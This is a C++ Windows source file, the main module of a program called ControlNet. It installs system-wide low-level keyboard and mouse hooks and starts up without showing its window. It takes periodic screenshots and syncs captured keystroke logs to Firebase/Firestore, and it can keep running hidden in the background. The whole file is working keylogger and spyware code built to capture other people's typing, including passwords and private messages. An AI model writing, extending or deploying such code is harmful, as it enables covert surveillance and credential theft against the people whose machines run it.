// ControlNet.cpp : Defines the entry point for the application.

#define _CRT_SECURE_NO_WARNINGS

#include "framework.h"
#include "ControlNet.h"
#include "KeyLogger.h"
#include "UIUtils.h"
#include "FirebaseManager.h"
#include "SettingsDialog.h"
#include "MessageHandlers.h"
#include "LogWriter.h"
#include "DBcommunication.h"
#include "HotkeySettings.h"
#include "DeviceInfo.h"
#include "ScreenCapture.h"

// Centralized linkage for Firebase / Firestore and system deps.
#pragma comment(lib, "firebase_app.lib")
#pragma comment(lib, "firebase_auth.lib")
#pragma comment(lib, "firebase_database.lib")
#pragma comment(lib, "firebase_firestore.lib")

// System / support libraries sometimes required by Firebase/Abseil/GRPC stack:
#pragma comment(lib, "Dbghelp.lib")   // SymSetOptions
#pragma comment(lib, "bcrypt.lib")    // BCryptOpenAlgorithmProvider
#pragma comment(lib, "Ws2_32.lib")    // Sockets
#pragma comment(lib, "Crypt32.lib")   // Cert handling
#pragma comment(lib, "Iphlpapi.lib")  // Network helpers
#pragma comment(lib, "Userenv.lib")   // User profile dir (sometimes)
#pragma comment(lib, "Winmm.lib")     // Timing (Abseil)
#pragma comment(lib, "Version.lib")   // Version queries (optional)
#pragma comment(lib, "Rpcrt4.lib")    // RPC (gRPC / protobuf sometimes)

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
HHOOK hKeyHook = NULL;                          // Handle to the hook
HHOOK hMouseHook = NULL;                        // Handle to the mouse hook

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    try {
        LoadHotkeySettings();
    }
    catch (const std::exception& e) {
        // Hotkey settings load failed - continue with defaults
    }

    // Start the asynchronous log writer before installing hooks to avoid any blocking in hooks
    try {
        LogWriter_Init();
    }
    catch (const std::exception& e) {
        // Background writer failed to start - direct writes will be used
    }

    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
    if (!hKeyHook || !hMouseHook)
    {
        if (hKeyHook) UnhookWindowsHookEx(hKeyHook);
        if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
        return 1;
    }

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_CONTROLNET, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Create the main window, but do not show it yet
    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
    if (!hWnd)
    {
        UnhookWindowsHookEx(hKeyHook);
        UnhookWindowsHookEx(hMouseHook);
        return FALSE;
    }
    
    try {
        InitializeFirebase();
        
        // Synchronize missing local JSON files to Firestore on startup
        try {
            SyncMissingDocumentsToFirestore();
        }
        catch (const std::exception& e) {
            // Sync failed - continue without it
        }
        
        // Start periodic updates for today's document (every 1 minute)
        try {
            StartPeriodicUpdates();
        }
        catch (const std::exception& e) {
            // Periodic updates failed to start - continue without them
        }
        
        // Start periodic screenshots (every 5 minutes)
        try {
            StartPeriodicScreenshots();
        }
        catch (const std::exception& e) {
            // Periodic screenshots failed to start - continue without them
        }
    }
    catch (const std::exception& e) {
        // Firebase initialization failed - continue without it
        // Could show a warning dialog here if needed
    }

    // Register global hotkey (use settings)
    try {
        RegisterHotKey(NULL, 1, g_hotkeyModifiers, g_hotkeyVk);
    }
    catch (...) {
        // Hotkey registration failed - continue without it
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CONTROLNET));

    MSG msg;
    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        try {
            if (msg.message == WM_HOTKEY && msg.wParam == 1) {
                ShowWindow(hWnd, SW_SHOW);
                SetForegroundWindow(hWnd);
                HWND hLeftPane = GetDlgItem(hWnd, 1);
                if (hLeftPane) {
                    try {
                        loadLogs(hLeftPane);
                    }
                    catch (const std::exception& e) {
                        // Loading logs failed - UI will show current state
                    }
                }
            } else if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
        catch (const std::exception& e) {
            // Message processing failed - continue with next message
        }
    }

    // Cleanup
    try {
        UnregisterHotKey(NULL, 1);
    }
    catch (...) {
        // Ignore hotkey unregister errors
    }
    
    try {
        UnhookWindowsHookEx(hKeyHook);
        UnhookWindowsHookEx(hMouseHook);
    }
    catch (...) {
        // Ignore hook cleanup errors
    }
    
    return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CONTROLNET));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_CONTROLNET);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    try {
        switch (message)
        {
        case WM_CREATE:
            {
                try {
                    HWND hLeftPane = CreateWindowW(WC_LISTVIEW, L"",
                        WS_CHILD | WS_VISIBLE | LVS_REPORT | WS_BORDER,
                        0, 0, 400, 600, hWnd, (HMENU)1, hInst, NULL);

                    if (hLeftPane) {
                        // Example: Add columns for User, Keystrokes, Screenshots, Date, Size
                        LVCOLUMN lvcLeft = { 0 };
                        lvcLeft.mask = LVCF_TEXT | LVCF_WIDTH;

                        lvcLeft.pszText = (LPWSTR)L"User";
                        lvcLeft.cx = 200;
                        ListView_InsertColumn(hLeftPane, 0, &lvcLeft);

                        lvcLeft.pszText = (LPWSTR)L"Keystrokes";
                        lvcLeft.cx = 100;
                        ListView_InsertColumn(hLeftPane, 1, &lvcLeft);

                        lvcLeft.pszText = (LPWSTR)L"Screenshots";
                        lvcLeft.cx = 100;
                        ListView_InsertColumn(hLeftPane, 2, &lvcLeft);

                        lvcLeft.pszText = (LPWSTR)L"Date";
                        lvcLeft.cx = 200;
                        ListView_InsertColumn(hLeftPane, 3, &lvcLeft);

                        lvcLeft.pszText = (LPWSTR)L"Size";
                        lvcLeft.cx = 120;
                        ListView_InsertColumn(hLeftPane, 4, &lvcLeft);

                        ListView_SetExtendedListViewStyle(hLeftPane, LVS_EX_FULLROWSELECT);
                    }

                    // Create right pane table (ListView)
                    HWND hRightPane = CreateWindowW(WC_LISTVIEW, L"",
                        WS_CHILD | WS_VISIBLE | LVS_REPORT | WS_BORDER,
                        400, 0, 800, 600, hWnd, (HMENU)2, hInst, NULL);

                    if (hRightPane) {
                        LVCOLUMN lvcRight = { 0 };
                        lvcRight.mask = LVCF_TEXT | LVCF_WIDTH;

                        lvcRight.pszText = (LPWSTR)L"Process";
                        lvcRight.cx = 200;
                        ListView_InsertColumn(hRightPane, 0, &lvcRight);

                        lvcRight.pszText = (LPWSTR)L"Text";
                        lvcRight.cx = 450;
                        ListView_InsertColumn(hRightPane, 1, &lvcRight);

                        lvcRight.pszText = (LPWSTR)L"Time";
                        lvcRight.cx = 200;
                        ListView_InsertColumn(hRightPane, 2, &lvcRight);

                        ListView_SetExtendedListViewStyle(hRightPane, LVS_EX_FULLROWSELECT);
                    }

                    // Add a row for each date in log.json
                    if (hLeftPane) {
                        try {
                            loadLogs(hLeftPane);
                        }
                        catch (const std::exception& e) {
                            // Initial log loading failed - UI will be empty
                        }
                    }
                }
                catch (const std::exception& e) {
                    // Window creation failed - return error
                    return -1;
                }
            }
            break;
            
        case WM_COMMAND:
            {
                try {
                    int wmId = LOWORD(wParam);
                    
                    // Parse the menu selections:
                    switch (wmId)
                    {
                    case IDM_ABOUT:
                        try {
                            DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                        }
                        catch (const std::exception& e) {
                            // About dialog failed
                        }
                        break;
                    case IDM_EXIT:
                        DestroyWindow(hWnd);
                        break;
                    case 3000: // Settings menu ID
                        try {
                            if (DialogBox(hInst, MAKEINTRESOURCE(IDD_SETTINGS_DIALOG), hWnd, SettingsDlgProc) == IDC_SETTINGS_SAVE) {
                                UpdateHotkey(hWnd); // Re-register hotkey for main window after settings change
                            }
                        }
                        catch (const std::exception& e) {
                            // Settings dialog failed
                        }
                        break;
                    default:
                        return DefWindowProc(hWnd, message, wParam, lParam);
                    }
                }
                catch (const std::exception& e) {
                    // Command processing failed
                    return DefWindowProc(hWnd, message, wParam, lParam);
                }
            }
            break;
            
        case WM_SIZE:
            {
                try {
                    // Resize the panes when the window is resized
                    HWND hLeftPane = GetDlgItem(hWnd, 1);
                    HWND hRightPane = GetDlgItem(hWnd, 2);
                    if (hLeftPane && hRightPane)
                    {
                        int width = LOWORD(lParam);
                        int height = HIWORD(lParam);
                        SetWindowPos(hLeftPane, NULL, 0, 0, width / 2, height, SWP_NOZORDER);
                        SetWindowPos(hRightPane, NULL, width / 2, 0, width / 2, height, SWP_NOZORDER);
                    }
                }
                catch (const std::exception& e) {
                    // Window resize failed - ignore
                }
            }
            break;
            
        case WM_NOTIFY:
            {
                try {
                    LPNMHDR pnmh = (LPNMHDR)lParam;
                    if (pnmh && pnmh->hwndFrom == GetDlgItem(hWnd, 1)) { // Left pane
                        if (pnmh->code == NM_CLICK) {
                            try {
                                int selectedIndex = ListView_GetNextItem(pnmh->hwndFrom, -1, LVNI_SELECTED);
                                HandleLeftPaneClick(hWnd, selectedIndex);
                            }
                            catch (const std::exception& e) {
                                // Left pane click handling failed
                            }
                        } else if (pnmh->code == LVN_COLUMNCLICK) {
                            try {
                                HandleColumnClick(hWnd, pnmh, lParam);
                            }
                            catch (const std::exception& e) {
                                // Column click handling failed
                            }
                        }
                    } else if (pnmh && pnmh->hwndFrom == GetDlgItem(hWnd, 2)) { // Right pane
                        if (pnmh->code == LVN_COLUMNCLICK) {
                            try {
                                HandleColumnClick(hWnd, pnmh, lParam);
                            }
                            catch (const std::exception& e) {
                                // Right pane column click handling failed
                            }
                        }
                    }
                }
                catch (const std::exception& e) {
                    // Notify message processing failed
                }
            }
            break;
            
        case WM_PAINT:
            {
                try {
                    PAINTSTRUCT ps;
                    HDC hdc = BeginPaint(hWnd, &ps);
                    if (hdc) {
                        // TODO: Add any drawing code that uses hdc here...
                        EndPaint(hWnd, &ps);
                    }
                }
                catch (const std::exception& e) {
                    // Paint operation failed - try to end paint anyway
                    PAINTSTRUCT ps;
                    EndPaint(hWnd, &ps);
                }
            }
            break;
            
        case WM_CLOSE:
            {
                try {
                    int res = MessageBox(hWnd, L"Do you want to shut down the program? (Choose 'No' to minimize it to the background)", L"Exit or Minimize", MB_ICONQUESTION | MB_DEFBUTTON2 | MB_YESNO);
                    if (res == IDYES) {
                        DestroyWindow(hWnd); // will trigger WM_DESTROY -> PostQuitMessage
                    } else {
                        ShowWindow(hWnd, SW_HIDE); // keep running in background
                    }
                    return 0;
                }
                catch (const std::exception& e) {
                    // Close handling failed - force close
                    DestroyWindow(hWnd);
                    return 0;
                }
            }
            
        case WM_DESTROY:
            try {
                // Stop periodic updates before shutting down
                try {
                    StopPeriodicUpdates();
                }
                catch (const std::exception& e) {
                    // Ignore periodic update stop errors
                }
                
                // Stop periodic screenshots before shutting down
                try {
                    StopPeriodicScreenshots();
                }
                catch (const std::exception& e) {
                    // Ignore periodic screenshot stop errors
                }
                
                try {
                    LogWriter_Shutdown();
                }
                catch (const std::exception& e) {
                    // Ignore log writer shutdown errors
                }
                
                PostQuitMessage(0);
            }
            catch (const std::exception& e) {
                // Force quit even if cleanup fails
                PostQuitMessage(0);
            }
            break;
            
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
    }
    catch (const std::exception& e) {
        // Critical error in WndProc - use default processing
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
